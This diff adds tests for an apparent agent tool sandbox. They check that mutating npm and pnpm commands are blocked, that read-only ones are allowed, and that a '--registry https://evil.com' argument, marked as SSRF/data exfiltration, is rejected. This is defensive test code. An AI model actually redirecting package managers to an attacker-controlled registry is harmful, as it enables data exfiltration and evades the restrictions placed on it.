@@ -275,6 +275,76 @@ for (const args of [
   assertBlocked(r, `acli ${args.join(" ")} should be blocked`);
 }
 
+console.log("\n=== npm tool tests ===");
+
+// Blocked subcommands (mutating operations)
+for (const args of [
+  ["install"], ["ci"], ["update"], ["uninstall", "lodash"],
+  ["run", "build"], ["exec", "tsc"], ["publish"], ["init"],
+  ["link"], ["pack"], ["prune"], ["rebuild"], ["dedupe"],
+]) {
+  const r = await server.callTool("npm", { args });
+  assertBlocked(r, `npm ${args.join(" ")} should be blocked`);
+}
+
+// Blocked flags
+const npmAuditFix = await server.callTool("npm", { args: ["audit", "--fix"] });
+assertBlocked(npmAuditFix, "npm audit --fix should be blocked");
+
+// --registry (SSRF / data exfiltration)
+const npmRegistry = await server.callTool("npm", { args: ["view", "zod", "--registry", "https://evil.com"] });
+assertBlocked(npmRegistry, "npm --registry should be blocked");
+
+const npmRegistryEq = await server.callTool("npm", { args: ["view", "zod", "--registry=https://evil.com"] });
+assertBlocked(npmRegistryEq, "npm --registry=<url> should be blocked");
+
+// Allowed subcommands
+const npmLs = await server.callTool("npm", { args: ["ls"] });
+assertNotBlocked(npmLs, "npm ls should be allowed");
+
+const npmExplain = await server.callTool("npm", { args: ["explain", "zod"] });
+assertNotBlocked(npmExplain, "npm explain should be allowed");
+
+const npmView = await server.callTool("npm", { args: ["view", "zod"] });
+assertNotBlocked(npmView, "npm view should be allowed");
+
+console.log("\n=== pnpm tool tests ===");
+
+// Blocked subcommands (mutating operations)
+for (const args of [
+  ["add", "lodash"], ["remove", "lodash"], ["install"],
+  ["update"], ["run", "build"], ["exec", "tsc"],
+  ["publish"], ["init"], ["link"], ["unlink"],
+  ["store", "prune"], ["patch", "lodash"],
+]) {
+  const r = await server.callTool("pnpm", { args });
+  assertBlocked(r, `pnpm ${args.join(" ")} should be blocked`);
+}
+
+// Blocked flags
+const pnpmAuditFix = await server.callTool("pnpm", { args: ["audit", "--fix"] });
+assertBlocked(pnpmAuditFix, "pnpm audit --fix should be blocked");
+
+// --registry (SSRF / data exfiltration)
+const pnpmRegistry = await server.callTool("pnpm", { args: ["list", "--registry", "https://evil.com"] });
+assertBlocked(pnpmRegistry, "pnpm --registry should be blocked");
+
+const pnpmRegistryEq = await server.callTool("pnpm", { args: ["list", "--registry=https://evil.com"] });
+assertBlocked(pnpmRegistryEq, "pnpm --registry=<url> should be blocked");
+
+// Allowed subcommands
+const pnpmList = await server.callTool("pnpm", { args: ["list"] });
+assertNotBlocked(pnpmList, "pnpm list should be allowed");
+
+const pnpmWhy = await server.callTool("pnpm", { args: ["why", "zod"] });
+assertNotBlocked(pnpmWhy, "pnpm why should be allowed");
+
+const pnpmLicenses = await server.callTool("pnpm", { args: ["licenses", "list"] });
+assertNotBlocked(pnpmLicenses, "pnpm licenses list should be allowed");
+
+const pnpmStoreStatus = await server.callTool("pnpm", { args: ["store", "status"] });
+assertNotBlocked(pnpmStoreStatus, "pnpm store status should be allowed");
+
 console.log("\n=== Edge cases ===");
 
 // Empty args
